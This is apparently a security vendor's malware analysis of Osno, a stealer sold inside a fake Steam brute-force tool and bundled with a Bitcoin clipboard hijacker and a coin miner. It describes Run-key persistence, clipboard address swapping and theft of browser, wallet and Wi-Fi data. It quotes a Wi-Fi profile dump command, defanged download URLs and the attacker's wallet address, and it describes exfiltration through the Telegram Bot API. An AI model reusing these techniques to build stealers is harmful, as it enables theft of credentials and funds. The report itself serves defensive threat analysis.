Osno – A Stealer and a Miner in One

In the earlier days, threat actors used to create malware for a specific job. For instance, ransomware.
However, these days threat actors have started creating malware which are versatile. Here, in this blog we
will be explaining about one such malware, Osno, which is both a Stealer and a Miner.
Osno Recovery Tool/Stealer steals browser data, wallet details, captures screenshot of system and grabs
details of installed programs. Earlier this year, Osno stealer when downloaded installed both a rootkit and
its ransomware on the victim’s system. Here, we will be getting into the nuances of an archive file
“Steam_Machine_Checker.rar” which can be downloaded from the site
hxxps[:]//www[.]upload[.]ee/files/12701875/Steam_Machine_Checker[.]rar[.]html and comes bundled with
Osno stealer, BTC Clipboard Hijacker along with a Coinminer.

Figure 1:

Malware Download
Steam is a digital store for purchasing, downloading and playing video games. “Steam Machine Brute
Force Checker” is a hacktool for brute forcing passwords for Steam Engine. The author tries to lure illegal
game users into downloading this tool bundled with malware.
After execution of the Steam_Machine_Checker.exe, it opens the GUI screen of “Steam Machine Brute
Force checker” in the frontend and starts its malicious activity in the backend.

Process Flow
SteamMachine.exe executes service.exe and then SteamMachineService.exe which are not malicious by
themselves.

Persistence
Update.exe creates Run entry for persistence in the
“HKCU\Software\Microsoft\Windows\CurrentVersion\Run” registry location and points to the file in
“%AppData%\Roaming\scvhost\scvhostservice.exe“. Scvhostservice.exe initiates svchost.exe which in turn
does coin mining.

Clipboard Hijacker
Ctfmom.exe and _CL_02f3a8c9sy is dropped in “%Appdata%/Roaming/Microsoft” by config.exe.
_CL_02f3a8c9sy has base64 encoded data.

Figure 6: ctfmom.exe – Clipboard

Hijacker
It gets the current Clipboard using Clipboard.GetText( ). If the hash in currentClipboard starts with ‘1’ it
replaces it with 1LrPUuoopchKbfkJYLEwk2YWqBh6ZakTxX using Clipboard.SetText( ).
Clipboard.GetText – Retrieves text data from the Clipboard.
Clipboard.SetText – Clears the Clipboard and then adds text data to it.
A common user may not notice any change while pasting for a BTC transaction. Hackers will succeed in
getting bitcoins using such transactions (wrong transaction for the user).

This transaction ID has been actively receiving Bitcoins by abusing clipboard. Some users have reported
the replacement of their hash with the malware author’s hash in the same site.

Osno Stealer
Configs.exe starts MsBuild.exe for stealer activity. MSBuild.exe steals bookmarks (for finding victim’s
preferred site which could be internet banking or bitcoin transaction site), wallets, list of running process
(using tasklist.exe), hardware and software installed – Anti-Virus, firewall etc., which is kept in the temp
folder with MD5 (username)/MD5 (machinename).
‘"cmd.exe" /C chcp 65001 && netsh wlan show profile | findstr All’

is used for viewing Wireless AutoConfig Service profile and converting to UTF-8 format and the list of
Bitcoin wallet searched: Zcash, Armory, Bytecoin, Ethereum, Exodus, Electrum, Coinomi, Guarda, Atomic,
Litecoin, Dash, Bitcoin.
It also downloads CommandCam.exe from
hxxp[:]//raw[.]githubusercontent[.]com/tedburke/CommandCam/master/CommandCam[.]exe
for capturing screenshots of the system.
The screenshot is saved as screen.jpg

Data in Temp Folder
Signature.txt, created by MSBuild.exe, is found in temp directory has the string “Osno Recovery Tool
version 2.1.5”

Figure 11: Contents in Signature.txt
Hardware & Soft.txt created by MSBuild.exe also has the string “OsnoStealer WifiFucker v2” and other
details like Firewall, Anti-Virus, Timezone, Country, and HWID.

Figure 12:

Contents in Hardware & Soft.txt
MSBuild.exe also gets a list of all the stored files present in each directory. It is then stored in the subfolder
‘Dirs’ as Desktop.txt, Documents.txt, Downloads.txt, OneDrive.txt, Pictures.txt, Startup.txt, Temp.txt and
Videos.txt.

Stealer data in Directory Structure
It then sends the stolen data in temp via telegram using ‘sendDocument’ of Telegram Bot API. This method
is used to send general files.

sendDocument
sendDocument (chat_id, document)
Use this method to send general files. On success, the sent message is returned. Bots can currently send
files of any type of up to 50 MB in size, this limit may be changed in the future.

Coinminer
Along with the stealer and BTC Clipboard Hijacking, it also does coin mining. The files seen in Figure 16
are dropped by update.exe which is responsible for coin mining.

Svchost.exe dropped in AppData\Roaming\scvhost does coinminer activity. Svchost.exe is a legitimate
coinmining file given malicious parameters by the threat actors to do their illegal work.

Litecoin, as shown in Figure 17, is a purportedly technical improvement of Bitcoin that is capable of faster
turnarounds via its Scrypt mining algorithm (Bitcoin uses SHA-256). The Litecoin Network is able to
produce 84 million Litecoins—four times as many cryptocurrency units issued by Bitcoin.

Packet
Osno stealer not only keeps evolving its techniques and code to stay undetected but also comes bundled
with coinminer and BTC Clipboard Hijacker for malware author’s direct monetary benefit. Users are
advised not to download and install hacking tool software from untrusted sites, which might actually be a
trap laid out for them. It is also recommended to double check the hash while doing a BTC transaction. We
at K7 detect all such malicious files. Users are advised to install a reputable security product like “K7 Total
Security” and keep it updated to stay safe from the latest threats.
